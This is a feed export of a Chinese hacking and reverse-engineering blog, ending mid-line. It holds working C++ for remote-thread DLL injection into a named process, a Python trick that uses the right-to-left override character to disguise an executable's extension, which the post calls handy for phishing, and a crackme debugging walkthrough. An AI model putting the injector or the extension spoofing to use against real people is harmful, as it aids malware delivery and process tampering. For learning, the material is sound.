&lt;h2 id=&quot;安装&quot;&gt;&lt;a href=&quot;#安装&quot; class=&quot;headerlink&quot; title=&quot;安装&quot;&gt;&lt;/a&gt;安装&lt;/h2&gt;&lt;figure class=&quot;highlight golang&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;go&lt;/span&gt; get github.com/akkuman/parseConfig&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&quot;使用说明&quot;&gt;&lt;a href=&quot;#使用说明&quot; class=&quot;headerlink&quot; title=&quot;使用说明&quot;&gt;&lt;/a&gt;使用说明&lt;/h2&gt;
    
    </summary>
    
      <category term="Golang" scheme="http://hacktech.cn/categories/Golang/"/>
    
    
      <category term="Golang" scheme="http://hacktech.cn/tags/Golang/"/>
    
  </entry>
  
  <entry>
    <title>dll注入到指定进程</title>
    <link href="http://hacktech.cn/2017/10/24/dll%E6%B3%A8%E5%85%A5%E5%88%B0%E6%8C%87%E5%AE%9A%E8%BF%9B%E7%A8%8B.html"/>
    <id>http://hacktech.cn/2017/10/24/dll注入到指定进程.html</id>
    <published>2017-10-24T05:21:30.000Z</published>
    <updated>2017-11-02T05:24:11.580Z</updated>
    
    <content type="html"><![CDATA[<p>talk is cheap,show me code<br>代码有详细注释，文章底部提示了一些坑<br><a id="more"></a></p>
<h2 id="主程序"><a href="#主程序" class="headerlink" title="主程序"></a>主程序</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdafx.h"</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tlhelp32.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tchar.h&gt;</span></span></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">EnableDebugPriv</span><span class="params">(<span class="keyword">char</span>* name)</span></span></div><div class="line">&#123;</div><div class="line">	HANDLE hToken;</div><div class="line">	TOKEN_PRIVILEGES tp;</div><div class="line">	LUID luid;</div><div class="line">	<span class="comment">//打开进程令牌环</span></div><div class="line">	OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &amp;hToken);</div><div class="line">	<span class="comment">//获得进程本地唯一ID</span></div><div class="line">	LookupPrivilegeValue(<span class="literal">NULL</span>, name, &amp;luid);</div><div class="line"></div><div class="line">	tp.PrivilegeCount = <span class="number">1</span>;</div><div class="line">	tp.Privileges[<span class="number">0</span>].Attributes = SE_PRIVILEGE_ENABLED;</div><div class="line">	tp.Privileges[<span class="number">0</span>].Luid = luid;</div><div class="line">	<span class="comment">//调整权限</span></div><div class="line">	AdjustTokenPrivileges(hToken, <span class="number">0</span>, &amp;tp, <span class="keyword">sizeof</span>(TOKEN_PRIVILEGES), <span class="literal">NULL</span>, <span class="literal">NULL</span>);</div><div class="line">	<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">//*****************************************************************************************************************************</span></div><div class="line"></div><div class="line"><span class="function">BOOL <span class="title">InjectDll</span><span class="params">(LPCSTR DllFullPath, <span class="keyword">const</span> DWORD dwRemoteProcessId)</span></span></div><div class="line">&#123;</div><div class="line">	<span class="comment">// 提升权限(必须管理员身份)</span></div><div class="line">	EnableDebugPriv(SE_DEBUG_NAME);</div><div class="line"></div><div class="line">	<span class="comment">//打开远程线程</span></div><div class="line">	HANDLE hRemoteProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwRemoteProcessId);</div><div class="line">	<span class="keyword">if</span> (hRemoteProcess == <span class="literal">NULL</span>)</div><div class="line">	&#123;</div><div class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">"Error: OpenProcess failed!\n"</span> &lt;&lt; <span class="built_in">endl</span>;</div><div class="line">		<span class="keyword">return</span> FALSE;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="comment">//使用VirtualAllocEx函数在远程进程的内存地址空间分配DLL文件名空间</span></div><div class="line">	LPVOID pszLibFileRemote = VirtualAllocEx(hRemoteProcess, <span class="literal">NULL</span>, lstrlen(DllFullPath) + <span class="number">1</span>, MEM_COMMIT, PAGE_READWRITE);</div><div class="line">	<span class="keyword">if</span> (pszLibFileRemote == <span class="literal">NULL</span>)</div><div class="line">	&#123;</div><div class="line">		CloseHandle(hRemoteProcess);</div><div class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">"Error: VirtualAllocEx failed!\n"</span> &lt;&lt; <span class="built_in">endl</span>;</div><div class="line">		<span class="keyword">return</span> FALSE;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="comment">//使用WriteProcessMemory函数将DLL的路径名写入到远程进程的内存空间</span></div><div class="line">	<span class="keyword">if</span> (!WriteProcessMemory(hRemoteProcess, pszLibFileRemote, DllFullPath, lstrlen(DllFullPath) + <span class="number">1</span>, <span class="literal">NULL</span>))</div><div class="line">	&#123;</div><div class="line">		CloseHandle(hRemoteProcess);</div><div class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">"Error: WriteProcessMemory failed!\n"</span> &lt;&lt; <span class="built_in">endl</span>;</div><div class="line">		<span class="keyword">return</span> FALSE;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="comment">//启动远程线程LoadLibraryA，通过远程线程调用创建新的线程</span></div><div class="line">	HANDLE hRemoteThread;</div><div class="line">	<span class="keyword">if</span> ((hRemoteThread = CreateRemoteThread(hRemoteProcess, <span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)LoadLibraryA, pszLibFileRemote, <span class="number">0</span>, <span class="literal">NULL</span>)) == <span class="literal">NULL</span>)</div><div class="line">	&#123;</div><div class="line">		CloseHandle(hRemoteProcess);</div><div class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">"Error: the remote thread could not be created.\n"</span> &lt;&lt; <span class="built_in">endl</span>;</div><div class="line">		<span class="keyword">return</span> FALSE;</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">else</span></div><div class="line">	&#123;</div><div class="line">		<span class="comment">// 等待线程退出 要设置超时 以免远程线程挂起导致程序无响应</span></div><div class="line">		<span class="comment">//WaitForSingleObject(hRemoteThread, 10000);</span></div><div class="line">		<span class="comment">// 如果等待线程 DLL中的DllMain不要写MessageBox</span></div><div class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">"Success: the remote thread was successfully created.\n"</span> &lt;&lt; <span class="built_in">endl</span>;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="comment">// 释放句柄</span></div><div class="line">	CloseHandle(hRemoteProcess);</div><div class="line">	CloseHandle(hRemoteThread);</div><div class="line"></div><div class="line">	<span class="keyword">return</span> TRUE;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// 根据进程名称获取进程ID</span></div><div class="line"><span class="function">DWORD <span class="title">FindTarget</span><span class="params">(LPCSTR lpszProcess)</span></span></div><div class="line">&#123;</div><div class="line">	DWORD dwRet = <span class="number">0</span>;</div><div class="line">	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span class="number">0</span>);</div><div class="line">	PROCESSENTRY32 pe32;</div><div class="line">	pe32.dwSize = <span class="keyword">sizeof</span>(PROCESSENTRY32 );</div><div class="line">	Process32First(hSnapshot, &amp;pe32 );</div><div class="line">	<span class="keyword">do</span></div><div class="line">	&#123;</div><div class="line">		<span class="keyword">if</span> (lstrcmpi(pe32.szExeFile, lpszProcess) == <span class="number">0</span>)</div><div class="line">		&#123;</div><div class="line">			dwRet = pe32.th32ProcessID;</div><div class="line">			<span class="keyword">break</span>;</div><div class="line">		&#125; </div><div class="line">	&#125; <span class="keyword">while</span> (Process32Next(hSnapshot, &amp;pe32));</div><div class="line">	CloseHandle(hSnapshot);</div><div class="line">	<span class="keyword">return</span> dwRet; </div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">//*****************************************************************************************************************************</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line"></div><div class="line">	DWORD id = FindTarget((LPCSTR)<span class="string">"calc.exe"</span>);</div><div class="line">	<span class="built_in">cout</span> &lt;&lt; id &lt;&lt; <span class="built_in">endl</span>;</div><div class="line"></div><div class="line">	<span class="comment">// 获取可执行文件所在目录</span></div><div class="line">	TCHAR szFilePath[MAX_PATH + <span class="number">1</span>];</div><div class="line">	GetModuleFileName(<span class="literal">NULL</span>, szFilePath, MAX_PATH);</div><div class="line">	*(_tcsrchr(szFilePath, <span class="string">'\\'</span>)) = <span class="number">0</span>;</div><div class="line"></div><div class="line">	_tcscat_s(szFilePath, <span class="keyword">sizeof</span>(szFilePath), <span class="string">"\\dll.dll"</span>);</div><div class="line">	<span class="built_in">cout</span> &lt;&lt; szFilePath &lt;&lt; <span class="built_in">endl</span>;</div><div class="line">	InjectDll(szFilePath, id);<span class="comment">//这个数字是你想注入的进程的ID号</span></div><div class="line">	<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="dllmain"><a href="#dllmain" class="headerlink" title="dllmain"></a>dllmain</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdafx.h"</span></span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"></div><div class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">(HINSTANCE hInst     <span class="comment">/* Library instance handle. */</span>,</span></span></div><div class="line">	DWORD reason        <span class="comment">/* Reason this function is being called. */</span>,</div><div class="line">	LPVOID reserved     <span class="comment">/* Not used. */</span>)</div><div class="line">&#123;</div><div class="line">	<span class="keyword">switch</span> (reason)</div><div class="line">	&#123;</div><div class="line">	<span class="keyword">case</span> DLL_PROCESS_ATTACH: <span class="comment">//当这个DLL被映射到了进程的地址空间时</span></div><div class="line">		MessageBox(<span class="number">0</span>, TEXT(<span class="string">"From DLL\n"</span>), TEXT(<span class="string">"Process Attach"</span>), MB_ICONINFORMATION);</div><div class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">"Process Attach"</span> &lt;&lt; <span class="built_in">endl</span>;</div><div class="line">		<span class="keyword">break</span>;</div><div class="line"></div><div class="line">	<span class="keyword">case</span> DLL_PROCESS_DETACH: <span class="comment">//这个DLL从进程的地址空间中解除映射</span></div><div class="line">		MessageBox(<span class="number">0</span>, TEXT(<span class="string">"From DLL\n"</span>), TEXT(<span class="string">"Process Detach"</span>), MB_ICONINFORMATION);</div><div class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">"Process Detach"</span> &lt;&lt; <span class="built_in">endl</span>;</div><div class="line">		<span class="keyword">break</span>;</div><div class="line"></div><div class="line">	<span class="keyword">case</span> DLL_THREAD_ATTACH: <span class="comment">//一个线程正在被创建</span></div><div class="line">		MessageBox(<span class="number">0</span>, TEXT(<span class="string">"From DLL\n"</span>), TEXT(<span class="string">"Thread Attach"</span>), MB_ICONINFORMATION);</div><div class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">"Thread Attach"</span> &lt;&lt; <span class="built_in">endl</span>;</div><div class="line">		<span class="keyword">break</span>;</div><div class="line"></div><div class="line">	<span class="keyword">case</span> DLL_THREAD_DETACH: <span class="comment">//线程终结</span></div><div class="line">		MessageBox(<span class="number">0</span>, TEXT(<span class="string">"From DLL\n"</span>), TEXT(<span class="string">"Thread Detach"</span>), MB_ICONINFORMATION);</div><div class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">"Thread Detach"</span> &lt;&lt; <span class="built_in">endl</span>;</div><div class="line">		<span class="keyword">break</span>;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="keyword">return</span> TRUE;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="需要注意的地方"><a href="#需要注意的地方" class="headerlink" title="需要注意的地方"></a>需要注意的地方</h2><ol>
<li>环境是vs，字符集是多字节</li>
<li>这份代码中的<code>hRemoteThread = CreateRemoteThread(hRemoteProcess, NULL, 0, (LPTHREAD_START_ROUTINE)LoadLibraryA, pszLibFileRemote, 0, NULL)</code>中的也可采用GetProcAddress函数  </li>
<li>这份代码并不是通用注入代码（如果需要通用需要自行解析pe头结构从中取出kernel32.dll的GetProcAddress地址）,所以64位windows上需要把vs设置为编译x64</li>
</ol>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;talk is cheap,show me code&lt;br&gt;代码有详细注释，文章底部提示了一些坑&lt;br&gt;
    
    </summary>
    
      <category term="逆向" scheme="http://hacktech.cn/categories/%E9%80%86%E5%90%91/"/>
    
    
      <category term="逆向" scheme="http://hacktech.cn/tags/%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>从右向左覆盖实现恶意软件扩展名欺骗</title>
    <link href="http://hacktech.cn/2017/10/24/%E4%BB%8E%E5%8F%B3%E5%90%91%E5%B7%A6%E8%A6%86%E7%9B%96%E5%AE%9E%E7%8E%B0%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E6%89%A9%E5%B1%95%E5%90%8D%E6%AC%BA%E9%AA%97.html"/>
    <id>http://hacktech.cn/2017/10/24/从右向左覆盖实现恶意软件扩展名欺骗.html</id>
    <published>2017-10-24T05:20:07.000Z</published>
    <updated>2017-11-02T05:20:55.433Z</updated>
    
    <content type="html"><![CDATA[<p>这个技术虽然老掉牙，但在网络钓鱼中非常好用<br><a id="more"></a></p>
<h2 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">1.py</div><div class="line">rc_srceen.exe</div></pre></td></tr></table></figure>
<h2 id="py文件内容"><a href="#py文件内容" class="headerlink" title="py文件内容"></a>py文件内容</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> os</div><div class="line">name = <span class="string">"\u202Excod.exe"</span></div><div class="line">os.rename(os.path.join(os.getcwd(),<span class="string">'re_screen.exe'</span>),os.path.join(os.getcwd(),<span class="string">"re_screen"</span>+name))</div></pre></td></tr></table></figure>
<h2 id="执行后"><a href="#执行后" class="headerlink" title="执行后"></a>执行后</h2><p><img src="http://images2017.cnblogs.com/blog/1106918/201710/1106918-20171024180520926-960725164.png" alt=""></p>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>Unicode包含若干个特殊字符串，允许在正常情况下从左到右的文本中插入从右到左的文字.其中一个右到左覆写字符串就是“U+202E”<br>详见<a href="http://toutiao.secjia.com/right-to-left-override" target="_blank" rel="external">千万小心从右向左覆盖技术 恶意软件经常用这个方法骗用户</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这个技术虽然老掉牙，但在网络钓鱼中非常好用&lt;br&gt;
    
    </summary>
    
      <category term="Hacker" scheme="http://hacktech.cn/categories/Hacker/"/>
    
    
      <category term="Hacker" scheme="http://hacktech.cn/tags/Hacker/"/>
    
  </entry>
  
  <entry>
    <title>静态博客阅读次数与评论解决方案</title>
    <link href="http://hacktech.cn/2017/10/23/%E9%9D%99%E6%80%81%E5%8D%9A%E5%AE%A2%E9%98%85%E8%AF%BB%E6%AC%A1%E6%95%B0%E4%B8%8E%E8%AF%84%E8%AE%BA%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88.html"/>
    <id>http://hacktech.cn/2017/10/23/静态博客阅读次数与评论解决方案.html</id>
    <published>2017-10-23T05:18:40.000Z</published>
    <updated>2017-11-02T05:19:36.881Z</updated>
    
    <content type="html"><![CDATA[<p>基于LeanCloud的文章阅读次数统计插件<br><a href="https://github.com/Weic96/LeanStatistics.js" target="_blank" rel="external">https://github.com/Weic96/LeanStatistics.js</a></p>
<p>基于LeanCloud的文章评论<br><a href="https://github.com/xCss/Valine" target="_blank" rel="external">https://github.com/xCss/Valine</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;基于LeanCloud的文章阅读次数统计插件&lt;br&gt;&lt;a href=&quot;https://github.com/Weic96/LeanStatistics.js&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://github.com/Weic96/
    
    </summary>
    
      <category term="Hexo" scheme="http://hacktech.cn/categories/Hexo/"/>
    
    
      <category term="Hexo" scheme="http://hacktech.cn/tags/Hexo/"/>
    
  </entry>
  
  <entry>
    <title>Tuts4you注册问题解码</title>
    <link href="http://hacktech.cn/2017/09/24/Tuts4you-register.html"/>
    <id>http://hacktech.cn/2017/09/24/Tuts4you-register.html</id>
    <published>2017-09-24T08:19:00.000Z</published>
    <updated>2017-09-25T07:30:36.257Z</updated>
    
    <content type="html"><![CDATA[<p>只说一个，是八进制,下面是解码脚本<br>环境python3<br><a id="more"></a></p>
<p><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=28785327&auto=1&height=66"></iframe><br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*-coding:utf-8-*-</span></div><div class="line"><span class="comment"># Author: Akkuman</span></div><div class="line"><span class="comment"># Blog: hacktech.cn</span></div><div class="line"></div><div class="line"><span class="comment"># Tust4You的问题是八进制,所以八进制转ascii即可</span></div><div class="line"><span class="comment"># 解码问题</span></div><div class="line">print(<span class="string">"Please input the code what you see on register's page of Tust 4 You:"</span>)</div><div class="line">encode_code = input()</div><div class="line">encode_list = encode_code.split()</div><div class="line">print(<span class="string">"\nthe question is\n"</span>)</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> encode_list:</div><div class="line">	i = int(i,<span class="number">8</span>)</div><div class="line">	print(chr(i), end=<span class="string">""</span>)</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;只说一个，是八进制,下面是解码脚本&lt;br&gt;环境python3&lt;br&gt;
    
    </summary>
    
      <category term="逆向" scheme="http://hacktech.cn/categories/%E9%80%86%E5%90%91/"/>
    
    
      <category term="逆向" scheme="http://hacktech.cn/tags/%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>一个查表置换的CM</title>
    <link href="http://hacktech.cn/2017/09/20/%E4%B8%80%E4%B8%AA%E6%9F%A5%E8%A1%A8%E7%BD%AE%E6%8D%A2%E7%9A%84CM.html"/>
    <id>http://hacktech.cn/2017/09/20/一个查表置换的CM.html</id>
    <published>2017-09-19T17:01:15.000Z</published>
    <updated>2017-09-19T17:04:09.268Z</updated>
    
    <content type="html"><![CDATA[<p>说实话，今天被自己蠢哭了  </p>
<p>因为看多了一个字符，以为是输入字符变形后的base64编码，也怪自己没大致看过base64汇编形式，把base64跟完了用py实现完算法才意思到是base64，这是题外话<br><a id="more"></a><br>本人初学者，两天或一天一个cm练练，大家可以与我交流akkumans@qq.com，<a href="http://hacktech.cn">我博客</a>  </p>
<p>上面的题外话就是今天搞的一个cm，被自己蠢哭了，不过也算是base64编码流程无比清晰了，不算是无用功  </p>
<p>这个cm是一个控制台的，丢到xp无法运行，本机只装了x64dbg(x32dbg)，用这个调试软件来试试吧<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">C:\Users\Administrator\Desktop&gt;reverse3.exe</div><div class="line">Please enter the flag:97103012</div><div class="line">wrong input</div></pre></td></tr></table></figure></p>
<p>字符串搜索，找到判断的地方<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">01241269 | 85 C0                    | test eax,eax                             | zf=1 =&gt; eax=0</div><div class="line">0124126B | 75 07                    | jne reverse3.1241274                     |</div><div class="line">0124126D | 68 78 21 24 01           | push reverse3.1242178                    | 1242178:&quot;this is the right flag&quot;</div><div class="line">01241272 | EB 05                    | jmp reverse3.1241279                     |</div><div class="line">01241274 | 68 90 21 24 01           | push reverse3.1242190                    | 1242190:&quot;wrong input&quot;</div><div class="line">01241279 | FF 15 B0 20 24 01        | call dword ptr ds:[&lt;&amp;puts&gt;]              |</div><div class="line">0124127F | 8B 4D FC                 | mov ecx,dword ptr ss:[ebp-4]             |</div><div class="line">01241282 | 83 C4 04                 | add esp,4                                |</div><div class="line">01241285 | 33 CD                    | xor ecx,ebp                              |</div><div class="line">01241287 | 33 C0                    | xor eax,eax                              | eax:&quot;OTacMDMzMTI=&quot;</div><div class="line">01241289 | E8 92 00 00 00           | call reverse3.1241320                    |</div><div class="line">0124128E | 8B E5                    | mov esp,ebp                              |</div><div class="line">01241290 | 5D                       | pop ebp                                  |</div><div class="line">01241291 | C3                       | ret                                      |</div></pre></td></tr></table></figure></p>
<p>可以看到要得到flag，jne就不能跳，也就是<code>test eax,eax</code>后的ZF=1，也就是eax=0<br>那这个eax=0从何而来？我们接着往上看<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div></pre></td><td class="code"><pre><div class="line">012411A0 | 55                       | push ebp                                 |</div><div class="line">012411A1 | 8B EC                    | mov ebp,esp                              |</div><div class="line">012411A3 | 83 EC 44                 | sub esp,44                               |</div><div class="line">012411A6 | A1 04 30 24 01           | mov eax,dword ptr ds:[1243004]           | eax:&quot;OTacMDMzMTI=&quot;</div><div class="line">012411AB | 33 C5                    | xor eax,ebp                              |</div><div class="line">012411AD | 89 45 FC                 | mov dword ptr ss:[ebp-4],eax             |</div><div class="line">012411B0 | 0F 57 C0                 | xorps xmm0,xmm0                          |</div><div class="line">012411B3 | C7 45 F8 00 00 00 00     | mov dword ptr ss:[ebp-8],0               |</div><div class="line">012411BA | 68 58 21 24 01           | push reverse3.1242158                    | 1242158:&quot;Please enter the flag:&quot;</div><div class="line">012411BF | 0F 11 45 E8              | movups xmmword ptr ss:[ebp-18],xmm0      |</div><div class="line">012411C3 | 0F 11 45 C0              | movups xmmword ptr ss:[ebp-40],xmm0      |</div><div class="line">012411C7 | 0F 11 45 D0              | movups xmmword ptr ss:[ebp-30],xmm0      |</div><div class="line">012411CB | 66 0F D6 45 E0           | movq qword ptr ss:[ebp-20],xmm0          |</div><div class="line">012411D0 | E8 1B 01 00 00           | call reverse3.12412F0                    |</div><div class="line">012411D5 | 8D 45 E8                 | lea eax,dword ptr ss:[ebp-18]            |</div><div class="line">012411D8 | 50                       | push eax                                 | eax:&quot;OTacMDMzMTI=&quot;</div><div class="line">012411D9 | 68 70 21 24 01           | push reverse3.1242170                    | 1242170:&quot;%20s&quot;</div><div class="line">012411DE | E8 CD 00 00 00           | call reverse3.12412B0                    |</div><div class="line">012411E3 | 8D 4D E8                 | lea ecx,dword ptr ss:[ebp-18]            | 你的输入 -&gt; ecx</div><div class="line">012411E6 | 83 C4 0C                 | add esp,C                                |</div><div class="line">012411E9 | 8D 51 01                 | lea edx,dword ptr ds:[ecx+1]             | 你的输入减第一个字节 -&gt; edx</div><div class="line">012411EC | 0F 1F 40 00              | nop dword ptr ds:[eax]                   | eax:&quot;OTacMDMzMTI=&quot;</div><div class="line">012411F0 | 8A 01                    | mov al,byte ptr ds:[ecx]                 |</div><div class="line">012411F2 | 41                       | inc ecx                                  |</div><div class="line">012411F3 | 84 C0                    | test al,al                               |</div><div class="line">012411F5 | 75 F9                    | jne reverse3.12411F0                     |</div><div class="line">012411F7 | 2B CA                    | sub ecx,edx                              | 你的输入的长度 -&gt; ecx</div><div class="line">012411F9 | 8D 55 E8                 | lea edx,dword ptr ss:[ebp-18]            | 输入 -&gt; edx</div><div class="line">012411FC | 56                       | push esi                                 | esi:&quot;TacMDMzMTI=&quot;</div><div class="line">012411FD | 51                       | push ecx                                 |</div><div 